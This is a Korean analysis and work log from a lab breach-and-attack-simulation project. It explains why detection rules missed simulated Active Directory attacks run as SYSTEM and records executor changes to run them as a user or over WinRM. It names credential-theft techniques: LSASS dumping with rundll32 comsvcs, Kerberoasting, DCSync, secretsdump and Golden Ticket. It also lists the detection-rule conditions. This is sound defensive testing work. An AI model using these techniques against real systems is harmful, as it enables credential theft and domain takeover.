# SB-AD BAS 실행 컨텍스트 불일치 분석

## 1. 결론

현재 미탐으로 보이는 항목은 단순히 "탐지 룰이 틀렸다"로 판단하면 안 된다.

Notion의 `AWS AD 환경 구축 및 공격 수행`, `Technique 문서` 기준 시나리오는 다음 흐름이다.

1. 직원 PC 사용자인 `employee1`이 악성 파일을 실행한다.
2. 공격자는 PC01 reverse shell 또는 유사한 원격 cmd 세션을 얻는다.
3. 정보수집, Kerberoasting, 도구 다운로드는 장악된 PC01 사용자 컨텍스트에서 수행된다.
4. 탈취한 `svc_file` 자격 증명으로 PC01에서 FS01로 WinRM 원격 실행한다.
5. FS01에서 LSASS dump, staging, masquerading, archive, exfiltration을 수행한다.
6. Attacker Ubuntu에서 Impacket 기반 DCSync, Golden Ticket, psexec, NTDS dump를 수행한다.

하지만 현재 BAS는 다수 Technique을 Windows 서비스로 실행되는 BasAgent가 로컬 명령으로 수행한다. 이 경우 이벤트의 실행 주체가 `NT AUTHORITY\SYSTEM` 또는 `PC01$` 같은 머신 계정으로 남아, 탐지 룰이 기대한 `employee1`, `svc_file`, `wsmprovhost.exe` 흐름과 달라진다.

따라서 현재 BAS는 "명령 실행"은 되지만, 일부 Technique에서는 "공격 시나리오의 실행 컨텍스트 재현"이 부족하다.

## 2. 확인한 근거

### 2.1 Notion 시나리오 기준

Notion `Technique 문서`의 핵심 기준:

- T1204.002: `employee1`이 `SecurityUpdate.exe` 직접 실행
- T1059.003: 악성 파일이 `cmd.exe` 생성
- T1095: 공격자 IP 4444 포트로 TCP 연결
- T1087.002/T1018/T1033/T1135/T1069: 장악한 PC01에서 AD/시스템/공유/그룹 정보 수집
- T1558.003: Rubeus로 `svc_file` 서비스 티켓 요청
- T1021.006/T1059.001: `svc_file` 자격 증명으로 WinRM을 통해 FS01 원격 실행
- T1105: reverse shell에서 `Invoke-WebRequest`로 도구 다운로드
- T1003.001/T1218.011: FS01에서 `rundll32.exe comsvcs.dll MiniDump`
- T1074.001/T1036.005/T1560.001/T1041: FS01/공유 폴더를 통한 staging, masquerading, archive, exfiltration
- T1003.006/T1558.001/T1078.002/T1569.002/T1003.003: Attacker Ubuntu에서 Impacket 기반 도메인 장악

### 2.2 현재 BAS 실행 결과 근거

Operation `op-20260531-030304-c70f96` 기준:

- 1번 `SecurityUpdate.exe` 실행 stdout: `nt authority\system`
- 6번 `whoami` stdout: `nt authority\system`
- 9번 `klist get cifs/FS01.mycompany.local` stdout: Client가 `pc01$ @ MYCOMPANY.LOCAL`
- 10번 WinRM 실패 원인: `BAS_SVC_FILE_PASSWORD is missing on PC01 BasAgent`
- 11번 PowerShell stdout: `nt authority\system`
- 4, 5, 6, 7, 8, 9, 11, 15, 17, 18번은 원천 로그는 있으나 Alert 미발생

이 근거상 4~8번은 탐지 룰이 잘못됐다기보다, BAS Agent가 SYSTEM으로 실행해 룰의 `SYSTEM 제외` 조건과 충돌한 것으로 보는 것이 맞다.

## 3. Technique별 판단

| 번호 | Technique | 현재 BAS 실행 | 탐지 룰 기대 | 판단 | 고칠 수 있는가 |
| --- | --- | --- | --- | --- | --- |
| 1 | T1204.002 User Execution | PC01 Agent가 `SecurityUpdate.exe` 실행, 사용자 SYSTEM | 직원 사용자가 직접 악성 파일 실행 | BAS 컨텍스트 불일치 | 가능 |
| 2 | T1059.003 Cmd | PC01 Agent가 `cmd.exe` 실행 | 악성 파일 또는 reverse shell이 cmd 생성 | 현재도 탐지됨. 고도화 대상 | 가능 |
| 3 | T1095 TCP | PC01에서 attacker로 TCP 연결 | reverse shell TCP 연결 | 현재도 탐지됨. 고도화 대상 | 가능 |
| 4 | T1087.002 Domain Account Discovery | PC01 Agent가 SYSTEM으로 `net user /domain` | 장악된 사용자 세션에서 도메인 계정 조회 | BAS 컨텍스트 문제 | 가능 |
| 5 | T1018 Remote System Discovery | PC01 Agent가 SYSTEM으로 `nltest` | 장악된 사용자 세션에서 DC/호스트 탐색 | BAS 컨텍스트 문제 | 가능 |
| 6 | T1033 User Discovery | PC01 Agent가 SYSTEM으로 `whoami` | 장악된 사용자 계정 확인 | BAS 컨텍스트 문제 | 가능 |
| 7 | T1135 Share Discovery | PC01 Agent가 SYSTEM으로 SMB 공유 조회 | 장악된 사용자 세션에서 FS01 공유 확인 | BAS 컨텍스트 문제 | 가능 |
| 8 | T1069 Group Discovery | PC01 Agent가 SYSTEM으로 그룹 조회 | 장악된 사용자 세션에서 그룹 조회 | BAS 컨텍스트 문제 | 가능 |
| 9 | T1558.003 Kerberoasting | `klist`가 PC01 머신 계정으로 TGS 요청 | `employee1`이 `svc_file` SPN 티켓 요청 | BAS 기법 재현 부족 | 가능 |
| 10 | T1021.006 WinRM | PC01에서 FS01 WinRM 구조는 맞음. 환경변수 누락으로 실패 | FS01에서 `wsmprovhost.exe`, User `MYCOMPANY\svc_file` | BAS 환경 설정 문제 | 가능 |
| 11 | T1059.001 PowerShell over WinRM | FS01 Agent가 직접 PowerShell 실행 | FS01에서 `wsmprovhost.exe -> powershell.exe` | BAS 실행 경로 문제 | 가능 |
| 12 | T1105 Tool Transfer | FS01 Agent가 직접 다운로드 | 시나리오상 reverse shell/WinRM 이후 도구 다운로드 | 현재 탐지됨. 더 현실화 가능 | 가능 |
| 13 | T1003.001 LSASS Dump | FS01 Agent가 rundll32 실행 | FS01에서 rundll32/comsvcs로 LSASS dump | 실행 주체는 다르지만 핵심 로그는 맞음 | 유지 가능 |
| 14 | T1218.011 Rundll32 | FS01 Agent가 rundll32 실행 | rundll32/comsvcs MiniDump | BAS는 적절. 룰 공백 가능성 | 부분 가능 |
| 15 | T1074.001 Local Data Staging | FS01 Agent가 파일 생성 | 공격자가 FS01/공유 폴더에 파일 staging | 룰 공백 또는 컨텍스트 약함 | 가능 |
| 16 | T1041 Exfiltration | FS01 Agent가 HTTP POST | FS01에서 attacker로 HTTP POST | 현재 탐지됨. 유지 가능 | 유지 가능 |
| 17 | T1036.005 Masquerading | FS01 Agent가 위장 파일 생성 | 파일명 위장 및 위치 위장 | 룰 공백 또는 컨텍스트 약함 | 가능 |
| 18 | T1560.001 Archive | FS01 Agent가 Compress-Archive | 유출 전 파일 압축 | 룰 공백 또는 컨텍스트 약함 | 가능 |
| 19 | T1003.006 DCSync | Attacker에서 Impacket | Attacker에서 DC로 DCSync | 시나리오와 맞음 | 유지 |
| 20 | T1558.001 Golden Ticket | Attacker에서 ccache 사용 | Attacker에서 Golden Ticket 사용 | 시나리오와 맞음 | 유지 |
| 21 | T1078.002 Valid Account | Attacker에서 DC SMB logon | 외부/공격자 IP에서 관리자 계정 접근 | 시나리오와 맞음 | 유지 |
| 22 | T1569.002 Service Execution | Attacker psexec | psexec 서비스 생성 | 시나리오와 맞음 | 유지 |
| 23 | T1003.003 NTDS Dump | Attacker secretsdump | DC 장악 후 NTDS dump | 시나리오와 맞음. 룰은 별도/중복 이슈 | 유지 또는 룰 추가 |

## 4. 반드시 고쳐야 하는 항목

### 4.1 4~8번 Discovery 계열

#### 현재 문제

현재는 PC01 BasAgent가 Windows 서비스로 실행되고, 해당 서비스 권한이 SYSTEM이다. 따라서 `net`, `nltest`, `whoami` 결과와 Sysmon ProcessCreate의 `User`가 `NT AUTHORITY\SYSTEM`으로 남는다.

하지만 탐지 룰은 다음 조건을 갖고 있다.

- 4번: `not User: ("NT AUTHORITY\SYSTEM" or "MYCOMPANY\user_admin")`
- 5번: `not User: ("NT AUTHORITY\SYSTEM" or "MYCOMPANY\admin_user")`
- 6번: `not User: ("NT AUTHORITY\SYSTEM" or "MYCOMPANY\user_admin")`
- 7번: `not User: ("NT AUTHORITY\SYSTEM" or "MYCOMPANY\admin_user")`
- 8번: `not User: ("NT AUTHORITY\SYSTEM" or "MYCOMPANY\admin_user")`

즉, 룰 작성 의도는 "관리/시스템 작업이 아니라 장악된 사용자 세션의 정보 수집"을 잡는 것이다. BAS가 SYSTEM으로 실행하면 이 룰에 걸리지 않는 것이 정상이다.

#### 수정 방향

가장 좋은 방향은 PC01에 "사용자 컨텍스트 실행 모드"를 추가하는 것이다.

후보:

1. PC01 BasAgent를 `MYCOMPANY\employee1` 계정으로 실행
2. PC01 BasAgent는 SYSTEM으로 유지하되, 4~8번 명령만 `employee1` 컨텍스트로 실행
3. Attacker 또는 Controller가 PC01에 이미 열린 reverse shell/C2 세션을 통해 명령 전달

발표 안정성 기준 추천은 2번이다. 서비스 구조는 유지하면서 Technique별로 실행 주체만 바꾸는 방식이 가장 덜 위험하다.

구현 후보:

- Windows Task Scheduler를 사용해 `employee1` 권한의 일회성 작업 생성/실행
- PowerShell `Start-Process -Credential` 사용
- 별도 `user_agent`를 employee1 로그인 세션에서 실행

실무적으로 가장 안전한 방법은 `employee1`용 별도 BasAgent를 하나 더 두는 것이다.

```text
sbad-pc01-user-agent
  agent_role: pc01_user
  user_context: MYCOMPANY\employee1
  담당: 1~9번 사용자/초기 침투/정보수집

sbad-pc01-bas-agent
  agent_role: pc01
  user_context: NT AUTHORITY\SYSTEM
  담당: 시스템 권한 필요 작업 또는 fallback
```

### 4.2 9번 Kerberoasting

#### 현재 문제

현재 BAS는 PC01에서 `klist get cifs/FS01.mycompany.local`을 실행한다. Operation 결과에서는 Client가 `pc01$ @ MYCOMPANY.LOCAL`로 나왔다.

하지만 탐지 룰은 다음을 기대한다.

```text
Security 4769
TargetUserName: employee1* or employee2*
ServiceName: "svc_file"
```

즉, 룰은 사용자인 `employee1`이 `svc_file` SPN의 서비스 티켓을 요청하는 흐름을 기대한다. 머신 계정 `PC01$`이 요청하면 룰과 맞지 않는다.

#### 수정 방향

Notion 시나리오 기준으로는 Rubeus를 이용해 `svc_file`에 대한 티켓을 요청해야 한다.

수정 후보:

1. PC01 user agent에서 Rubeus kerberoast 실행
2. Windows 내장 명령만 사용하려면 `employee1` 컨텍스트에서 `klist get cifs/FS01.mycompany.local` 실행
3. Attacker에서 `GetUserSPNs.py`를 사용해 Kerberoasting을 수행

탐지 룰이 `employee1`과 `ServiceName: svc_file`을 기대하므로 1번 또는 2번이 더 적합하다. 다만 실제 4769의 `ServiceName` 필드는 SPN 설정에 따라 `svc_file`, `cifs/FS01...`, `FS01$` 등으로 다르게 남을 수 있어 실제 로그 샘플 확인은 필요하다.

우선순위는 다음과 같다.

1. PC01 `employee1` 컨텍스트로 실행되게 고친다.
2. `klist`로 충분한지 확인한다.
3. 룰이 기대하는 `ServiceName`과 실제 이벤트 필드가 다르면 Rubeus 또는 룰 조건 중 무엇이 시나리오와 맞는지 재검토한다.

### 4.3 10번 WinRM Remote Execution

#### 현재 문제

현재 BAS YAML은 이미 PC01에서 FS01로 WinRM을 실행하도록 작성되어 있다. 방향 자체는 맞다.

하지만 실제 실패 원인은 다음이다.

```text
BAS_SVC_FILE_PASSWORD is missing on PC01 BasAgent.
```

즉, 10번은 시나리오 불일치보다 PC01 Agent 실행 환경변수 누락 문제가 먼저다.

#### 수정 방향

PC01 BasAgent 서비스 또는 시작 스크립트에 다음 환경변수를 넣어야 한다.

```text
BAS_SVC_FILE_PASSWORD=<svc_file password>
```

그 다음 단독으로 10번만 실행해 FS01에 다음 로그가 남는지 확인한다.

```text
host.name: FS01.mycompany.local
event.code: 1
Image: C:\Windows\System32\wsmprovhost.exe
User: MYCOMPANY\svc_file
```

만약 이 조건이 뜨면 10번은 BAS 쪽 수정 완료로 볼 수 있다.

### 4.4 11번 PowerShell over WinRM

#### 현재 문제

현재 BAS는 11번을 FS01 Agent에서 직접 실행한다.

```text
agent_role: fs01
powershell.exe -NoProfile -Command "whoami; Get-Date"
```

Operation 결과 stdout도 `nt authority\system`이다.

하지만 탐지 룰은 다음을 기대한다.

```text
host.name: FS01.mycompany.local
event.code: 1
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentImage: C:\Windows\System32\wsmprovhost.exe
```

즉, FS01에서 직접 PowerShell이 실행되는 것이 아니라, PC01에서 WinRM으로 들어온 명령이 FS01의 `wsmprovhost.exe` 하위 PowerShell로 실행되어야 한다.

#### 수정 방향

11번은 10번과 같은 방식으로 PC01에서 `Invoke-Command`를 사용해야 한다.

현재:

```text
FS01 Agent -> powershell.exe
```

수정:

```text
PC01 Agent -> Invoke-Command -ComputerName FS01 -Credential svc_file -ScriptBlock { powershell command }
FS01 로그 -> wsmprovhost.exe -> powershell.exe
```

따라서 11번의 `agent_role`은 `fs01`이 아니라 `pc01`이어야 한다.

### 4.5 12, 15, 16, 17, 18번 FS01 후속 행위

#### 현재 문제

12, 15, 16, 17, 18번은 현재 FS01 Agent가 직접 실행한다. 일부는 탐지되지만, 시나리오 관점에서는 10번 이후 획득한 `svc_file` WinRM 세션에서 FS01 작업이 이어지는 편이 더 자연스럽다.

특히 15/17/18은 전용 Kibana 룰이 아직 없거나 약하기 때문에, 지금 당장 미탐의 주 원인은 룰 공백일 수 있다. 다만 BAS를 상용 BAS에 가깝게 만들려면 이 단계들도 `svc_file` WinRM 세션으로 실행하는 편이 좋다.

#### 수정 방향

선택지는 두 가지다.

1. 안정성 우선: FS01 Agent 직접 실행 유지
2. 시나리오 재현 우선: PC01에서 FS01로 WinRM 실행

탐지 룰이 WinRM 계보를 강조한다면 2번이 맞다.

권장:

- 12번 T1105: PC01에서 FS01로 `Invoke-Command` 후 FS01 내부에서 `Invoke-WebRequest`
- 15번 T1074.001: PC01에서 FS01로 `Invoke-Command` 후 FS01 공유 경로에 파일 생성
- 16번 T1041: FS01에서 attacker로 POST가 중요하므로 FS01 직접 실행도 가능하지만, WinRM 세션 하위 실행이 더 자연스러움
- 17번 T1036.005: FS01 공유 폴더에 위장 파일 생성
- 18번 T1560.001: FS01에서 `Compress-Archive`

### 4.6 23번 NTDS Dump

#### 현재 판단

Notion Technique 문서에도 "T1003.003 기준 탐지는 어렵고 기존 T1003.006 기준으로 탐지"라고 되어 있다.

현재 BAS의 23번은 Attacker에서 `secretsdump.py`를 실행하므로 공격 시나리오와 맞다. 이 항목은 BAS보다 탐지 룰 커버리지 문제에 가깝다.

다만 발표에서는 이렇게 정리하는 것이 정확하다.

```text
NTDS Dump는 DCSync/secretsdump 계열 행위와 로그가 겹치므로, 현재는 T1003.006 탐지 룰로 일부 커버하고 있다. T1003.003 전용 탐지를 강화하려면 4662 복제 이벤트, 7045 서비스 생성, ADMIN$ 접근, NTDS 관련 파일 접근을 상관분석해야 한다.
```

## 5. 구현 우선순위

### 1순위: PC01 user-context 실행 구조 만들기

대상:

- 1, 4, 5, 6, 7, 8, 9

목표:

- `NT AUTHORITY\SYSTEM`이 아니라 `MYCOMPANY\employee1` 또는 침해 사용자 컨텍스트로 이벤트 생성
- 9번 Kerberoasting에서 Client가 `PC01$`가 아니라 사용자 계정으로 남게 만들기

권장 구현:

- `pc01_user` role 추가
- employee1 로그인 세션 또는 별도 사용자 agent로 실행
- 어렵다면 일회성 Scheduled Task로 사용자 권한 실행

### 2순위: 10번 WinRM 환경변수/연결 안정화

대상:

- 10

목표:

- PC01에서 `svc_file`로 FS01 WinRM 실행
- FS01에서 `wsmprovhost.exe` 이벤트 생성

우선 확인할 것:

- PC01 Agent에 `BAS_SVC_FILE_PASSWORD` 설정 여부
- PC01 -> FS01 WinRM 연결 가능 여부
- svc_file이 FS01 원격 관리/로컬 관리자 권한을 갖는지 여부

### 3순위: 11번을 PC01 -> FS01 WinRM으로 변경

대상:

- 11

목표:

- FS01에서 `wsmprovhost.exe -> powershell.exe` 부모/자식 관계 생성

구현:

- `agent_role: pc01`
- `Invoke-Command -ComputerName FS01 -Credential svc_file -ScriptBlock { powershell.exe ... }`

### 4순위: 12/15/16/17/18 후속 행위 WinRM화

대상:

- 12, 15, 16, 17, 18

목표:

- FS01 Agent 직접 실행이 아니라, PC01에서 획득한 WinRM 경로로 FS01 행위 수행
- 시나리오 전체 흐름의 일관성 확보

단, 이 단계는 발표 안정성을 해칠 수 있으므로 10/11 성공 후 순차 적용한다.

### 5순위: 룰 공백 항목 정리

대상:

- 14, 15, 17, 18, 23

판단:

- BAS 실행 컨텍스트를 맞춰도 룰 자체가 없으면 Alert는 뜨지 않는다.
- 이 항목은 BAS 수정 후에도 누나에게 "룰 커버리지 공백"으로 전달해야 한다.

## 6. 실제 수정 예상 개수

### 최소 수정

최소 8개:

- 1
- 4
- 5
- 6
- 7
- 8
- 9
- 11

10번은 YAML보다 PC01 Agent 환경 설정 수정이 핵심이다.

### 권장 수정

권장 13개:

- 1
- 4
- 5
- 6
- 7
- 8
- 9
- 10
- 11
- 12
- 15
- 17
- 18

### 유지 가능

- 2, 3, 13, 16, 19, 20, 21, 22, 23

2/3/16은 더 현실화할 수는 있지만 이미 탐지 성공했으므로 우선순위는 낮다. 19~23은 Attacker Ubuntu에서 Impacket을 쓰는 방식이 시나리오와 맞다.

## 7. 안전 주의사항

VM을 망가뜨리지 않기 위해 다음 원칙을 지킨다.

- DC01에는 BAS Agent 설치하지 않는다.
- DC01 설정, AD 계정, GPO, 방화벽, Defender 설정을 임의 변경하지 않는다.
- PC01/FS01에는 새 영구 서비스 추가를 최소화한다.
- 사용자 컨텍스트 실행은 가능하면 일회성 작업 또는 별도 agent로 제한한다.
- LSASS dump, DCSync, NTDS dump는 gate가 열려 있을 때만 단독 실행한다.
- 23개 전체 실행 전에는 1개 Technique씩 검증한다.

## 8. 다음 작업 체크리스트

- [ ] PC01 Agent 실행 계정 확인
- [ ] PC01에 `BAS_SVC_FILE_PASSWORD` 적용 여부 확인
- [ ] `pc01_user` 실행 방식을 결정한다.
- [ ] 4~8번을 user-context로 단독 실행해 `User` 필드가 바뀌는지 확인한다.
- [ ] 9번을 user-context로 실행해 4769 Client/TargetUserName/ServiceName 필드를 확인한다.
- [ ] 10번을 단독 실행해 FS01 `wsmprovhost.exe` 로그가 남는지 확인한다.
- [ ] 11번을 PC01 -> FS01 WinRM 방식으로 바꾼다.
- [ ] 12/15/16/17/18을 WinRM 방식으로 바꿀지 안정성 기준으로 결정한다.
- [ ] BAS 수정 후에도 Alert가 안 뜨는 항목만 탐지 룰 보완 대상으로 다시 분리한다.

## 9. 최종 판단

고칠 수 있다.

다만 지금 해야 할 일은 탐지 룰을 바로 수정하는 것이 아니라, BAS가 Notion 시나리오의 실행 주체와 실행 경로를 제대로 재현하도록 바꾸는 것이다. 특히 `SYSTEM`으로 실행되는 PC01/FS01 Agent 로컬 명령은 실제 공격 세션의 사용자 컨텍스트와 다르기 때문에, 4~9번과 11번의 탐지 결과를 왜곡한다.

따라서 우선 BAS를 다음 방향으로 고도화한다.

```text
PC01 user-context / reverse-shell-like context
  -> 1, 4, 5, 6, 7, 8, 9

PC01 -> FS01 WinRM with svc_file
  -> 10, 11, 12, 15, 17, 18

FS01 local high-privilege action
  -> 13, 14, optionally 16

Attacker Ubuntu Impacket
  -> 19, 20, 21, 22, 23
```

이렇게 바꾸면 "BAS를 돌렸는데 룰이 안 잡힌다"가 아니라, "BAS가 실제 공격 흐름을 재현했고, 그 결과 어떤 룰이 커버하고 어떤 룰이 비어 있는지"를 더 정확히 말할 수 있다.

## 10. 진행 로그

### 2026-05-31 1차 수정

#### 수정 범위

필수 수정 후보 9개 중 코드/YAML 기준으로 8개를 직접 수정했다.

- 1번 T1204.002
- 4번 T1087.002
- 5번 T1018
- 6번 T1033
- 7번 T1135
- 8번 T1069
- 9번 T1558.003
- 11번 T1059.001

10번 T1021.006은 YAML 구조는 이미 PC01 -> FS01 WinRM 방식이었고, 이전 실패 원인이 `BAS_SVC_FILE_PASSWORD` 누락이었으므로 환경 설정 검증 대상으로 분리했다.

#### 구현한 것

1. `modules/attack/sb_ad_technique.py`에 `windows_scheduled_user` executor를 추가했다.
   - 목적: PC01 BasAgent가 SYSTEM으로 실행되더라도 특정 Technique 명령만 `MYCOMPANY\employee1` 사용자 컨텍스트로 실행하기 위함.
   - 방식: Windows Scheduled Task를 일회성으로 생성, 실행, 조회, 삭제한다.
   - 비밀번호는 코드에 저장하지 않고 `BAS_EMPLOYEE_PASSWORD` 환경변수로만 받는다.

2. `targets/SB-AD.yaml`의 `employee_user`를 `employee1`로 맞췄다.
   - Notion 시나리오에서 직원 PC 사용자는 `employee1`이다.
   - Kibana 9번 룰도 `employee1*` 또는 `employee2*`를 허용하므로 룰과도 충돌하지 않는다.

3. 1, 4, 5, 6, 7, 8, 9번 Technique을 `windows_scheduled_user` 실행으로 변경했다.
   - 기대 효과:
     - Sysmon ProcessCreate의 `User`가 `NT AUTHORITY\SYSTEM`이 아니라 `MYCOMPANY\employee1`로 남는다.
     - 4~8번 탐지 룰의 SYSTEM 제외 조건에 더 이상 걸리지 않는다.
     - 9번 Kerberoasting 요청 주체가 `PC01$` 머신 계정이 아니라 사용자 계정으로 바뀔 가능성이 높다.

4. 11, 12, 15, 16, 17, 18번을 FS01 Agent 직접 실행에서 PC01 -> FS01 WinRM 실행으로 변경했다.
   - 목적: FS01에서 `wsmprovhost.exe` 기반 원격 실행 흔적을 남기기 위함.
   - 비밀번호는 `BAS_SVC_FILE_PASSWORD` 환경변수로만 받는다.

5. `tools/sbad_start_windows_agent.ps1`에 `EmployeePassword` 파라미터를 추가했다.
   - 이 값이 들어오면 `BAS_EMPLOYEE_PASSWORD` 환경변수로 설정한다.
   - 기존 `SvcFilePassword`는 `BAS_SVC_FILE_PASSWORD`로 유지한다.

#### 문법 검증

다음 검증은 통과했다.

- `python3 -m py_compile modules/attack/sb_ad_technique.py`
- `YAML.load_file("campaigns/SB-AD.yaml")`
- `YAML.load_file("targets/SB-AD.yaml")`

#### 현재 Technique 실행 라우팅

```text
01 pc01 windows_scheduled_user
02 pc01 local
03 pc01 local
04 pc01 windows_scheduled_user
05 pc01 windows_scheduled_user
06 pc01 windows_scheduled_user
07 pc01 windows_scheduled_user
08 pc01 windows_scheduled_user
09 pc01 windows_scheduled_user
10 pc01 local
11 pc01 local
12 pc01 local
13 fs01 local
14 fs01 local
15 pc01 local
16 pc01 local
17 pc01 local
18 pc01 local
19 attacker local
20 attacker local
21 attacker local
22 attacker local
23 attacker local
```

#### 남은 검증

아직 실제 VM에서 실행 검증은 하지 않았다.

다음 검증 순서:

1. PC01 Agent에 `BAS_EMPLOYEE_PASSWORD`, `BAS_SVC_FILE_PASSWORD`가 설정되어 있는지 확인한다.
2. 6번 `whoami`를 단독 실행해 `MYCOMPANY\employee1`로 실행되는지 확인한다.
3. 4~8번을 단독 실행해 Kibana Alert가 뜨는지 확인한다.
4. 9번을 단독 실행해 DC01 4769 이벤트의 사용자 필드가 `employee1` 계열로 남는지 확인한다.
5. 10번을 단독 실행해 FS01에서 `wsmprovhost.exe`와 `MYCOMPANY\svc_file` 로그가 남는지 확인한다.
6. 11번을 단독 실행해 FS01에서 `wsmprovhost.exe -> powershell.exe` 부모/자식 관계가 남는지 확인한다.

#### 실패 가능성이 있는 부분

- `employee1`에게 Scheduled Task batch logon이 허용되지 않으면 `windows_scheduled_user` 실행이 실패할 수 있다.
- `BAS_EMPLOYEE_PASSWORD` 또는 `BAS_SVC_FILE_PASSWORD`가 PC01 Agent 환경에 없으면 1/4~11번이 실패한다.
- 9번은 사용자 컨텍스트로 바꿔도 실제 Security 4769의 `ServiceName` 필드가 Kibana 룰의 `"svc_file"`과 다르게 남을 수 있다. 이 경우 BAS 문제가 아니라 룰 필드 조건 재확인이 필요하다.
- 12/15/16/17/18번은 WinRM 경로로 바꿨기 때문에 10번 WinRM이 안정화되어야 의미 있게 동작한다.

### 2026-05-31 2차 수정

#### 보강한 것

`windows_scheduled_user` executor의 검증 가능성을 보강했다.

기존 1차 구현은 Scheduled Task 생성/실행/삭제는 수행하지만, 실제 명령의 stdout/stderr를 UI 결과에서 직접 확인하기 어려웠다. 이 상태에서는 6번 `whoami`를 단독 실행해도 실제로 `MYCOMPANY\employee1`로 실행됐는지 결과 화면에서 바로 보기 어렵다.

따라서 다음을 추가했다.

- Scheduled Task가 실행할 payload script와 wrapper script를 분리했다.
- wrapper script에서 실제 명령의 stdout/stderr를 `C:\ProgramData\SpacebarBAS\tasks` 아래 임시 파일로 redirect한다.
- 실행 후 stdout/stderr 파일을 읽어 BAS command result에 포함한다.
- 임시 payload, wrapper, stdout, stderr 파일은 실행 후 삭제한다.
- 고정 대기만 하지 않고, timeout 범위 안에서 `schtasks /Query` 결과를 확인하며 작업 종료를 기다린다.

#### 기대 효과

- 6번 `whoami` 검증 시 stdout에서 실제 실행 사용자를 확인할 수 있다.
- 4~9번 실패 시 단순히 `schtasks` 결과만 보는 것이 아니라 실제 명령 stderr도 확인할 수 있다.
- 일회성 작업과 임시 파일이 남을 가능성을 줄였다.

#### 문법 검증

다음 검증은 통과했다.

- `python3 -m py_compile modules/attack/sb_ad_technique.py`
- `YAML.load_file("campaigns/SB-AD.yaml")`
- `YAML.load_file("targets/SB-AD.yaml")`

#### 현재 남은 핵심 검증

아직 실제 VM에는 배포하지 않았다. 다음 단계는 원격 PC01 Agent에 수정 코드를 반영하고, 비밀번호를 코드에 저장하지 않은 상태에서 환경변수로만 주입한 뒤 단일 Technique을 검증하는 것이다.

우선순위:

1. 6번 `whoami` 단독 실행: `MYCOMPANY\employee1` stdout 확인
2. 10번 WinRM 단독 실행: FS01 `wsmprovhost.exe`, `MYCOMPANY\svc_file` 확인
3. 11번 PowerShell over WinRM 단독 실행: FS01 `wsmprovhost.exe -> powershell.exe` 확인
4. 9번 Kerberoasting 단독 실행: DC01 4769의 사용자/서비스 필드 확인

### 2026-05-31 3차 수정

#### 실제 단일 검증 결과

6번 `whoami`를 PC01에서 단독 실행했다.

결과:

- Operation: `op-20260531-121037-be151f`
- 상태: failed
- 실행 방식: `windows_scheduled_user`
- 원인: Scheduled Task는 등록됐지만 `employee1` 계정에 batch logon 권한이 없어 실행되지 않음
- 확인된 메시지: `Batch logon privilege needs to be enabled for the task principal.`
- Last Result: `267011`

이 결과는 BAS 명령 자체 문제가 아니라 사용자 컨텍스트 실행 방식의 문제다. 로컬 보안 정책에 `employee1`의 "Log on as batch job" 권한을 추가하면 해결할 수 있지만, 팀원 AWS 환경의 보안 정책을 영구 변경하는 방식이라 우선 배제한다.

#### 수정 방향 변경

1, 4, 5, 6, 7, 8, 9번은 Scheduled Task 방식 대신 `windows_credential_process` executor로 변경했다.

새 방식:

- PC01 BasAgent는 기존처럼 SYSTEM 권한으로 유지한다.
- Technique 실행 시에만 PowerShell `Start-Process -Credential`로 `MYCOMPANY\employee1` 프로세스를 생성한다.
- 비밀번호는 `BAS_EMPLOYEE_PASSWORD` 환경변수에서만 읽는다.
- 로컬 보안 정책, GPO, AD 설정은 변경하지 않는다.
- stdout/stderr는 임시 파일로 수집 후 삭제한다.

#### 기대 효과

- batch logon 권한 없이도 사용자 컨텍스트 실행이 가능할 수 있다.
- PC01의 영구 보안 설정을 바꾸지 않는다.
- 성공하면 4~8번의 Sysmon ProcessCreate `User`가 `MYCOMPANY\employee1`로 남을 가능성이 높다.

#### 현재 라우팅

```text
01 pc01 windows_credential_process
04 pc01 windows_credential_process
05 pc01 windows_credential_process
06 pc01 windows_credential_process
07 pc01 windows_credential_process
08 pc01 windows_credential_process
09 pc01 windows_credential_process
10 pc01 local
11 pc01 local
12 pc01 local
15 pc01 local
16 pc01 local
17 pc01 local
18 pc01 local
```

#### 남은 검증

다음으로 다시 6번만 단독 실행한다. 여기서 실패하면 가능한 원인은 다음이다.

- LocalSystem에서 `Start-Process -Credential` 호출이 제한됨
- `employee1` 비밀번호 불일치
- `employee1` 프로필 로드 또는 도메인 로그온 제한

이 경우 마지막 대안은 `employee1` 로그인 세션에서 별도 `pc01_user` Agent를 실행하는 방식이다. 이 방식은 실제 사용자 세션을 가장 잘 재현하지만, RDP/로그온 상태가 필요해 운영 복잡도가 증가한다.

### 2026-05-31 4차 수정

#### 추가 검증 결과

`windows_credential_process` 방식으로 6번 `whoami`를 다시 단독 실행했다.

결과:

- Operation: `op-20260531-121852-4ceb58`
- 상태: failed
- 실행 방식: `windows_credential_process`
- 실패 원인: LocalSystem에서 `Start-Process -Credential` 호출 시 `Access is denied`

즉, PC01 BasAgent가 SYSTEM으로 떠 있는 상태에서 PowerShell `Start-Process -Credential`로 `employee1` 프로세스를 직접 생성하는 방식은 현재 환경에서 막힌다.

#### 현재 판단

사용자 컨텍스트 실행을 자동화하는 현실적인 선택지는 다시 두 가지로 좁혀졌다.

1. `employee1`에 PC01 로컬 `Log on as batch job` 권한을 부여하고 `windows_scheduled_user`를 사용한다.
2. `employee1`로 실제 로그인된 세션에서 별도 `pc01_user` Agent를 띄운다.

2번은 실제 침해 사용자 세션을 가장 잘 재현하지만 RDP/로그온 상태가 필요하다. 발표 전 자동화 안정성 기준으로는 1번이 더 빠르다. 이 변경은 DC/AD/GPO가 아니라 PC01 로컬 user right 변경이며, 필요하면 원복할 수 있다.

#### 다음 수정

1, 4, 5, 6, 7, 8, 9번은 다시 `windows_scheduled_user` executor로 되돌렸다. 다음 단계에서는 PC01에 한해 `employee1`의 batch logon 권한을 임시 부여한 뒤 6번을 재검증한다.

### 2026-05-31 5차 검증

#### PC01 로컬 batch logon 권한 부여

PC01에 한해 `MYCOMPANY\employee1`의 `Log on as batch job` 권한을 임시 부여했다.

변경 범위:

- 대상: PC01 로컬 보안 정책
- 변경 항목: `SeBatchLogonRight`
- 백업 위치: `C:\ProgramData\SpacebarBAS\secpol-before-batch-right.inf`
- DC01, AD, GPO는 변경하지 않음

이 변경은 1, 4, 5, 6, 7, 8, 9번을 `employee1` 사용자 컨텍스트로 실행하기 위한 최소 변경이다.

#### 6번 단독 재검증 결과

6번 `whoami`를 다시 단독 실행했다.

결과:

- Operation: `op-20260531-122119-c1afda`
- 상태: completed
- Step 상태: success
- executor: `windows_scheduled_user`
- Last Result: `0`
- stdout: `mycompany\employee1`

#### 판단

